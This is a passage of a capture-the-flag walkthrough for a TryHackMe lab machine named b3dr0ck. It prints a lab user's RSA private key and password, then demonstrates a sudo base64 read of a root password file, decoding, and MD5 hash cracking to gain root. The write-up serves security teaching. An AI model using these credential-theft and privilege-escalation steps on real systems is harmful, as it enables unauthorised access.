73f3GTJkfpWovyRcNHnCdY8h54IKMXSkjeCSpHWRClbwGlNOWzc8LYUA3wggciGa
w2WTHCSktSC0RlFE7ym/CMlzOovDROz4cadeo76XjcyPCsF+ei3NuIsofAl4eYW8
DLvPzZZTMmdJU3XHtjM288ZhfC+OBEV5+qVVMQIDAQABAoIBABRw9z7VmCJ+vluX
RAb5PWoSj6+5QDtAW0kCQff3nNFG8thqSLy3HCA57aRb1+f+vD58YU1fiu0Jrpe3
ycMpRjXSPRWqv7Q0mVd474HS60cq1CaawT22dJ7acTqtCv1nHF9G3H33MzaFVTQx
FLwKzPdVy7843aoQmHu+Q/D0LUpjxxE70HsOmFZCKPkSE032cglwqvcimcjlmRKT
IuyP9e0BWxfM5ch/2aJ7J72p71/RiwG8WmetfbXygPIXTzy6mqgmvSEstidu8YXa
w8tsn2WA6xY+a8JEO0N5QIf/Lbr41undqhU7a9cfr/ErvMK0lpepuN382OzBfupo
F2zTYAECgYEA3TGZRVdWkfk3pzt3Vr9McWWPsREuQK+XV79SKcspcWn8WKhxT6hZ
sU04d9hlT0uea44xdoOdg4vRwtrNAKD8ZW+coL4n5PBDQrlpfVvYAlZaQycO0NXg
V5uVYOXUB1to8DKH0wNI17hS2DqNw/REBXT5V18Ok9POBaGqJQBgxnECgYEA3Hyk
HH4+ZT1NxUyeToDMjxJiMI/cn4/kzPFA3Au2Kl4H7J4vG3F6jh3WyUD3nEBgSLiR
C+3yYru18bQqTBvMmFXaZVt0urLxrYMz6Yf1/ieE7VU2PlPAVOVruDV0zzXwjgDt
dQSWwKehAJ24+jc+0T6X7LKB9qoKUX1v3tisWsECgYBti6fV0JheOOfYGbpTqvAn
5N2SGukmPhAc8/K0IhrHQW8pVVqw0baB+bVynSgnalLt/4D9qdczk+Zxszz+B7yY
W/tdHG/TkS4ueHcHD5peJfgT898BjDrMCJClaY1li17gPpZH6gOEWpQk5HLbTjj1
3uWx4LDug2IwJc2G/7Xt8QKBgQDJc5xiaDpMN9nh5eJSab39Dtfl9Nuockmjst4G
7zBuv2FQISt7UJCgXsULNq/F9M/EQdZM5whqi4VupKVsyo2BtheIOiqKFstYNKNu
wQnSQHtkeVHJWq5FIyTrtvPWCzuSE2jiXOH8fmxNas5C180uU5lt659xJuWslQZs
vt2jQQKBgEdJg8MRD3/7fyWAxt/HMqUxRS+YydbmcpL4IVldhSCDyviLyYt5A4Zj
uUkxROOHCnkAvdVJJIpgkJaElowR+KqEMYH0zxOUk/gk+nUKXPkL9DJjzi+Bgu4y
qKyrUQa9yl0JrWuAZrQXfcamQMtt4+v55kKnBQjIKyhEpeZNv7Mg
-----END RSA PRIVATE KEY-----
-----BEGIN CERTIFICATE-----
MIICnzCCAYcCAjA5MA0GCSqGSIb3DQEBCwUAMBQxEjAQBgNVBAMMCWxvY2FsaG9z
dDAeFw0yMzAxMTgxMjQzNThaFw0yMzAxMTkxMjQzNThaMBYxFDASBgNVBAMMC0Zy
ZWQgUnViYmxlMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAvoJRijlW
NdasylNH30gYlbJNjZOoNZwNJ894p4VFWPcfI7fQfc9kvrD/EF0Pk1FpCVen0W6u
npoyugse+pO1aNzdoVdGu7cZxv/2fVJQv9u3Pf6Jxgg9WoqiHaTBw3+gtK/BRJNp
Df/YJ9Zi6rj5YRVfaw2TLtOIdVL97tI2HlWnzmGO73f3GTJkfpWovyRcNHnCdY8h
54IKMXSkjeCSpHWRClbwGlNOWzc8LYUA3wggciGaw2WTHCSktSC0RlFE7ym/CMlz
OovDROz4cadeo76XjcyPCsF+ei3NuIsofAl4eYW8DLvPzZZTMmdJU3XHtjM288Zh
fC+OBEV5+qVVMQIDAQABMA0GCSqGSIb3DQEBCwUAA4IBAQCEc8pNeq6qP0w6cMFJ
UEi6i+zg5B91XDpq//D4S/QjTbf6lGTqWkll7XSJ6j4CZDDJE7PoV7WM6isECjFQ
VNwlHYLe5zuDqNp0oxNnJxMGF//g9ho4NL1dO+0xuJD4e2h2dNmAuwSFEyS0D88m
paV8r8+Wpc8FnA5b42LyaG5vErX0aKIKrJnoSTQuEqK4r0YbC0zLcpd0P4scdEzB
aMxfJhxv3NkIErveg84CpQR5wpC3jFyww7eaUDZgbavLmY4X2D7mpQWvtAJ3IPAb
SXI4p8n5xGdtX6kOA/h3wXKmpdAhQ+lKBmaNaPxrNno07gBchZAS3aHPs1wS99ox
uBzb
-----END CERTIFICATE-----
```

Now we have a certificate and a private key for fred... Let's try to use them on port `54321` like we did for user `barney` :  
```
attacker@AttackBox:~/b3dr0ck$ socat stdio ssl:10.10.245.34:54321,cert=cert_fred.txt,key=key_fred.txt,verify=0

 __     __   _     _             _____        _     _             _____        _ 
 \ \   / /  | |   | |           |  __ \      | |   | |           |  __ \      | |
  \ \_/ /_ _| |__ | |__   __ _  | |  | | __ _| |__ | |__   __ _  | |  | | ___ | |
   \   / _` | '_ \| '_ \ / _` | | |  | |/ _` | '_ \| '_ \ / _` | | |  | |/ _ \| |
    | | (_| | |_) | |_) | (_| | | |__| | (_| | |_) | |_) | (_| | | |__| | (_) |_|
    |_|\__,_|_.__/|_.__/ \__,_| |_____/ \__,_|_.__/|_.__/ \__,_| |_____/ \___/(_)
                                                                                 

Welcome: 'Fred Rubble' is authorized.
b3dr0ck>
```

It workded, let's see if we can get the password for user fred :  
```
b3dr0ck> hint
Password hint: YabbaDabbaD0000! (user = 'Fred Rubble')
```

We have the password for user `fred` ! Let's use `su fred` and escalate our privileges :  
```
barney@b3dr0ck:~$ su fred
Password: 
fred@b3dr0ck:/home/barney$
```

Let's get the `fred.txt` flag :  
```
fred@b3dr0ck:~$ ls
fred.txt
fred@b3dr0ck:~$ cat fred.txt 
THM{******************************}
```

**Question : What is fred's password ?**  
**Answer : YabbaDabbaD0000!**  

**Question : What is the fred.txt flag ?**  
**Answer : THM{*HIDDEN*}**  

## Privilege escalation (root)

Now, let's see our sudo rights :  
```
fred@b3dr0ck:~$ sudo -l
Matching Defaults entries for fred on b3dr0ck:
    insults, env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User fred may run the following commands on b3dr0ck:
    (ALL : ALL) NOPASSWD: /usr/bin/base32 /root/pass.txt
    (ALL : ALL) NOPASSWD: /usr/bin/base64 /root/pass.txt
```

We can base64 encode `/root/pass.txt`. Let's do this and decode it :  
```
fred@b3dr0ck:~$ sudo base64 /root/pass.txt | base64 -d
LFKEC52ZKRCXSWKXIZVU43KJGNMXURJSLFWVS52OPJAXUTLNJJVU2RCWNBGXURTLJZKFSSYK
```

Let's try to use this password for root :  
```
fred@b3dr0ck:~$ su root
Password: 
su: Authentication failure
```

It seems that the string we have is still encoded with another encoding. Let's try to decode it using [dcode](https://www.dcode.fr/identification-chiffrement). 
I figured out what encoding types was used. We need to use the string we have and decode it like with : Base32 -> Base64. And then, we have an MD5 
hash (I used [hashes.com](https://hashes.com/en/tools/hash_identifier) to identify the hash type) :  
![](https://i.imgur.com/8hSJMQs.jpg)  
![](https://i.imgur.com/nUy4Dy9.jpg)  
![](https://i.imgur.com/ehfFM2f.jpg)  

Now, let's try to crack this hash with [crackstation.net](https://crackstation.net/) :  
![](https://i.imgur.com/OhzpXUf.jpg)  

We have the password for `root` ! Let's use `su root` with this password :  
```
fred@b3dr0ck:~$ su root
Password: 
root@b3dr0ck:/home/fred#
```

We are `root` ! Let's get the `root.txt` flag :  
```
root@b3dr0ck:/home/fred# cat /root/root.txt 
THM{****************************}
```

## Conclusion

In this room, we practiced : 
- Ports/Services enumeration using [nmap](https://nmap.org/book/man.html)
- Basic website enumeration
- Basic service enumeration using [telnet](https://www.commandlinux.com/man-page/man1/telnet.1.html)
- Basic linux enumeration
- Decoding encoded string
- Hash cracking
- Basic privilege escalation

Thanks for this room ! And thanks for reading my write ups !
